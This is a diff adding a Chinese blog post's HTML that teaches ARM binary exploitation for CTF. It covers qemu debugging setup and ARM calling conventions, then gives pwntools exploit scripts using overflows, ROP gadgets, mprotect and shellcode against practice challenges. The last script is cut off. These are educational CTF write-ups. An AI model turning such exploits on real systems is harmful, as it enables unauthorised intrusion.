@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lazydaidai.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="arm-learning近期但凡是个比赛好像都是arm起手，为了能签上到只能学习一下了.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arm-learning">
+<meta property="og:url" content="https://lazydaidai.github.io/2021/05/01/2021/arm-learning/index.html">
+<meta property="og:site_name" content="DaiDai&#39;s blog">
+<meta property="og:description" content="arm-learning近期但凡是个比赛好像都是arm起手，为了能签上到只能学习一下了.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lazydaidai.github.io/2021/05/01/2021/arm-learning/main.png">
+<meta property="og:image" content="https://lazydaidai.github.io/2021/05/01/2021/arm-learning/vul.png">
+<meta property="article:published_time" content="2021-04-30T17:59:47.000Z">
+<meta property="article:modified_time" content="2021-05-05T12:33:41.369Z">
+<meta property="article:author" content="DaiDai">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lazydaidai.github.io/2021/05/01/2021/arm-learning/main.png">
+
+<link rel="canonical" href="https://lazydaidai.github.io/2021/05/01/2021/arm-learning/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>arm-learning | DaiDai's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">DaiDai's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lazydaidai.github.io/2021/05/01/2021/arm-learning/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/me.jpg">
+      <meta itemprop="name" content="DaiDai">
+      <meta itemprop="description" content="never stop learning">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DaiDai's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          arm-learning
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-01 01:59:47" itemprop="dateCreated datePublished" datetime="2021-05-01T01:59:47+08:00">2021-05-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-05 20:33:41" itemprop="dateModified" datetime="2021-05-05T20:33:41+08:00">2021-05-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="arm-learning"><a href="#arm-learning" class="headerlink" title="arm-learning"></a>arm-learning</h2><p>近期但凡是个比赛好像都是arm起手，为了能签上到只能学习一下了.</p>
+<a id="more"></a>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考<a target="_blank" rel="noopener" href="https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/">这篇文章</a>，下好依赖库就行了。然后使用下面的指令启动：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L ./ ./pwn</span><br></pre></td></tr></table></figure>
+<p>参数解释：</p>
+<ul>
+<li>qemu-: 选择相应qemu运行，例如aarch64的，对应就是qemu-aarch64,可以用自动补全看</li>
+<li>-L ./: 指定库位置，一般在<code>/usr</code>目录下<br>当然也可以这样<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L ./ ./melong</span><br></pre></td></tr></table></figure>
+把进程映射到1234端口，然后<code>gdb-multiarch</code>，里面用<code>target remote :1234</code>远程调试。<br>对于pwntools模板如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br></pre></td></tr></table></figure>
+<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2>这部分<strong>摘抄</strong>自<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112">这篇文章</a>，搜了几篇发现还是这个写得好。</li>
+</ul>
+<h3 id="寄存器规则"><a href="#寄存器规则" class="headerlink" title="寄存器规则"></a>寄存器规则</h3><ul>
+<li>子程序间通过寄存器R0～R3来传递参数。这时，寄存器R0～R3可记作arg0～arg3。被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值。</li>
+<li>在子程序中，使用寄存器R4～R11来保存局部变量。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值。R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li>
+<li>寄存器R12用作过程调用中间临时寄存器，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li>
+<li>寄存器R13用作堆栈指针，记作SP。在子程序中寄存器R13不能用作其他用途。寄存器SP在进入子程序时的值和退出子程序时的值必须相等。</li>
+<li>寄存器R14称为连接寄存器，记作LR。它用于保存子程序的返回地址。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li>
+<li>寄存器R15是程序计数器，记作PC。它不能用作其它用途。当执行一个分支指令时，PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置。</li>
+</ul>
+<h3 id="传参规则"><a href="#传参规则" class="headerlink" title="传参规则"></a>传参规则</h3><ul>
+<li>对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。</li>
+<li>在传递参数时，将所有参数看作是存放在连续的内存字单元的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。<h3 id="返回值规则"><a href="#返回值规则" class="headerlink" title="返回值规则"></a>返回值规则</h3></li>
+<li>结果为一个32位整数时，可以通过寄存器R0返回</li>
+<li>结果为一个64位整数时，可以通过寄存器R0和R1返回</li>
+<li>结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回</li>
+<li>结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回</li>
+<li>对于位数更多的结果，需要通过内存来传递。<h3 id="访址规则"><a href="#访址规则" class="headerlink" title="访址规则"></a>访址规则</h3></li>
+</ul>
+<ol>
+<li>通常，LDR指令被用来从内存中加载数据到寄存器，STR指令被用作将寄存器的值存放到内存中。  <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">LDR</span>操作：从<span class="built_in">R0</span>指向的地址中取值放到<span class="built_in">R2</span>中</span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, [<span class="built_in">R0</span>] <span class="comment">@ [R0] - 数据源地址来自于R0指向的内存地址  </span></span><br><span class="line"><span class="symbol">STR</span>操作：将<span class="built_in">R2</span>中的值放到<span class="built_in">R1</span>指向的地址中</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R2</span>, [<span class="built_in">R1</span>] <span class="comment">@ [R1] - 目的地址来自于R1在内存中指向的地址 </span></span><br></pre></td></tr></table></figure>
+示例代码：  <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data</span>          <span class="comment">/* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/</span></span><br><span class="line"><span class="symbol">var1:</span> <span class="meta">.word</span> <span class="number">3</span>  <span class="comment">/* 内存中的第一个变量且赋值为3 */</span></span><br><span class="line"><span class="symbol">var2:</span> <span class="meta">.word</span> <span class="number">4</span>  <span class="comment">/* 内存中的第二个变量且赋值为4 */</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text</span>          <span class="comment">/* 代码段开始 */</span> </span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, adr_var1  <span class="comment">@ 将存放var1值的地址adr_var1加载到寄存器R0中 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r1</span>, adr_var2  <span class="comment">@ 将存放var2值的地址adr_var2加载到寄存器R1中 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>]      <span class="comment">@ 将R0所指向地址中存放的0x3加载到寄存器R2中  </span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>]      <span class="comment">@ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3</span></span><br><span class="line">    <span class="keyword">bkpt</span>    </span><br></pre></td></tr></table></figure></li>
+<li>典型指令<br>形如<code>[Ri , num]</code>的方式被称为立即数作偏移寻址。<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#2</span>]  <span class="comment">@ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。</span></span><br><span class="line"><span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#4</span>]! <span class="comment">@ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r1</span>], <span class="number">#4</span>  <span class="comment">@ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4.</span></span><br></pre></td></tr></table></figure>
+形如<code>[Ri , Rj]</code>的方式被称为寄存器作偏移寻址。<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>]  <span class="comment">@ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 </span></span><br><span class="line"><span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>]! <span class="comment">@ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r1</span>], <span class="built_in">r2</span>  <span class="comment">@ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。</span></span><br></pre></td></tr></table></figure>
+形如<code>[Ri , Rj , &lt;shifter&gt;]</code>的方式被称为寄存器缩放值作偏移寻址。<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>, LSL<span class="number">#2</span>]  <span class="comment">@ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。</span></span><br><span class="line"><span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>, LSL<span class="number">#2</span>]! <span class="comment">@ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&lt;&lt;2。</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r1</span>], <span class="built_in">r2</span>, LSL<span class="number">#2</span>  <span class="comment">@ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&lt;&lt;2。</span></span><br></pre></td></tr></table></figure>
+<h3 id="AArch64-架构"><a href="#AArch64-架构" class="headerlink" title="AArch64 架构"></a>AArch64 架构</h3>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。其中X0-X7为传参寄存器，X29为FP, X30为LR。</li>
+</ol>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj_typo"></a>jarvisoj_typo</h3><p>简单的栈溢出，静态编译的题，程序里有<code>system</code>,又有这样一个gadget：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br></pre></td></tr></table></figure>
+<p>直接控制r0和pc就行了，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28245</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;quit\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) * <span class="number">2</span> + p32(<span class="number">0x110B4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h3><p>算是arm的第一题，一个aarch64的题，逻辑看上去很简单，直白的溢出。</p>
+<p>main函数里向bss上写了一堆东西。<br><img src="/2021/05/01/2021/arm-learning/main.png" alt="main"><br>vul函数里有明显的溢出。<br><img src="/2021/05/01/2021/arm-learning/vul.png" alt="vul"><br>注意到v1居然在sp上面，第一次见。这样就控制不到vul函数的ret了，但是能控制到main函数的ret。同时也恰好绕过了canary，真离谱。<br>爆破出溢出长度，注意到巨大的<code>mprotect</code>, 结合前面往bss写大概已经知道思路了，<code>mprotect</code>改bss然后跳转执行shellcode。<br>程序里<code>mprotect</code>已经被调用了，直接取并改掉第一个参数就是了。然后正常的搜索gadget发现搜pop居然没搜到…</p>
+<p>这就是arm吗，i了。根据汇编学习知道有<code>ld</code>指令也可以交互栈和寄存器。<br>找到如下两个gadget：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4008AC : ldr x3, [x21, x19, lsl #3] ; mov x2, x22 ; mov x1, x23 ; mov w0, w24 ; add x19, x19, #1 ; blr x3</span><br><span class="line"></span><br><span class="line">0x4008CC ： ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret</span><br></pre></td></tr></table></figure>
+<p>组合利用就能控制x0和程序流了，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.aarch64.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu/&quot;, &quot;./pwn&quot;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29026</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x4007E0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(<span class="number">0x4008CC</span>) <span class="comment"># pc, gadget 1</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x0</span>)  <span class="comment"># x29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)  <span class="comment"># x30, ret address ----&gt; gadget 2</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>)  <span class="comment"># x19</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>)  <span class="comment"># x20</span></span><br><span class="line">payload += p64(<span class="number">0x0411068</span>)  <span class="comment"># x21---&gt; input</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)  <span class="comment"># x22---&gt; mprotect , rwx</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)  <span class="comment"># x23---&gt; mprotect , size</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)  <span class="comment"># x24---&gt; mprotect , address</span></span><br><span class="line">payload += p64(<span class="number">0x0411068</span> + <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x0411068</span> + <span class="number">0x10</span>) <span class="comment"># ret to shellcode</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>说点别的，注意到arm的ret只是直接跳转寄存器（如x30），所以rop很有意思，比如这一题的gadget就是从栈上找x30,查看vul函数的返回方式也是这样的，看得出arm和x86不一样的地方了。</p>
+<p>回头看这题又有了新发现，在后面会说到qemu默认是没有保护的，所以这个nx跟不存在一样，直接写shellcode并跳转就完了。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.aarch64.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu/&quot;, &quot;./pwn&quot;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28071</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(<span class="number">0x0411068</span>) </span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h3><p>直接给溢出。查阅资料说qemu默认启动保护全关，所以NX跟不存在一样，阅读汇编发现类似x86的利用ebp进行任意写，那就写shellcode进bss然后栈迁移。</p>
+<p>观察main函数的返回方式不难发现较为类似<code>leave; ret</code>，测试发现在溢出点紧跟的值也就会成为r11(fp)。exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./pwn&quot;])</span></span><br><span class="line">p = remote(<span 